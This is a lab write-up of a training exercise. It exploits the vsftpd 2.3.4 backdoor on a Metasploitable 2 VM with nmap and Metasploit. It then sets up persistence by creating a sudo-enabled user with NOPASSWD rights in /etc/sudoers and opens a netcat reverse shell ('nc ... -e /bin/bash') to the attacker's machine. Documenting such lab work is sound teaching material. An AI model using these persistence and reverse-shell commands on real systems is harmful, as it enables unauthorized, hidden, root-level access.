# Metasploitable 2 - vsftpd 2.3.4 Exploitation & Persistence

- Identify and exploit the `vsftpd 2.3.4` vulnerability on a Metasploitable 2 machine.
- Establish persistence using post-exploitation techniques.

## Step 1: Environment Setup
- Attacker Machine	Kali Linux
- Target Machine	Metasploitable 2 (VM)

## Step 2: Vulnerability Discovery
First, find the **target IP address** of the Metasploitable 2 machine by running the `ifconfig` command **inside the Metasploitable terminal**.

![](https://github.com/deepthiii33/sapienceintern/blob/main/task4/screenshots/target-ip.png)

In this case, the target IP address is: `192.168.1.6`
 - Scan target for open ports and services: ``nmap -sV 192.168.1.6``

![](https://github.com/deepthiii33/sapienceintern/blob/main/task4/screenshots/nmap-output.png)

Detected vulnerable FTP service: vsftpd 2.3.4

## Step 3: Exploiting vsftpd Using Metasploit
Lanuch Metasploit by ``msfconsole``

![](https://github.com/deepthiii33/sapienceintern/blob/main/task4/screenshots/msfconsole.png)

 - load the exploit(set **RHOSTS as target IP**)
   
![](https://github.com/deepthiii33/sapienceintern/blob/main/task4/screenshots/msfconsole-exploit.png)

Gained shell access to the victim machine

After gaining shell access, the basic commands were used to verify access level and gather basic system information

## Step 4: Establishing Persistence (User-Based)
**Here , i created a new user : hackerr**
 1. Create a new user: ``useradd -m -s /bin/bash hackerr``
 2. Set password: ``echo "hackerr:toor" | chpasswd``
 3. Grant root (sudo) privileges: ``echo "hackerr ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers``
 4. Switch to the user:
      - ``su hackerr``
      - ``sudo su``
5. Test the access by basic commands : whoami,id,ls,hostname,id,pwd
   
![](https://github.com/deepthiii33/sapienceintern/blob/main/task4/screenshots/metasploit-new-user.png)

Persistence Achieved via Sudo-Enabled User. The user hackerr now exists on the victim. Can log in and escalate to root without password using sudo su.

## Step 5: Establishing Reverse Shell with Netcat
After exploitation, a reverse shell was established from the victim (Metasploitable 2) to the attacker (Kali) using **Netcat**.

**On the Victim (Metasploitable 2):**
Used Netcat to connect back to the attacker's listener: ``nc 192.168.1.10 4444 -e /bin/bash``. 
![](https://github.com/deepthiii33/sapienceintern/blob/main/task4/screenshots/metasploit-nc.png)

Here , 192.168.1.10 is attacker-ip(kali)

**On attacker machine(Kali):**
- Listener port(4444) was set up and a successful connection was received: ``nc -lvnp 4444``
- Once connected, system enumeration was performed: ``whoami , hostname , id , uname -a , ls -la``

![](https://github.com/deepthiii33/sapienceintern/blob/main/task4/screenshots/netcat-output.png)



## ✅ Conclusion

In this project, the vsftpd 2.3.4 vulnerability on a Metasploitable 2 machine was successfully discovered and exploited using Metasploit. A reverse shell was established using Netcat, granting root access to the victim machine. Post-exploitation enumeration confirmed full control over the target, and persistence was achieved by creating a new user with sudo privileges. All steps were thoroughly documented with commands, screenshots, and outputs.
This exercise demonstrated a full exploitation chain — from vulnerability scanning to post-exploitation and persistence — using real-world pentesting tools and techniques.

>  This setup was used in a controlled environment for educational purposes only.


  


  





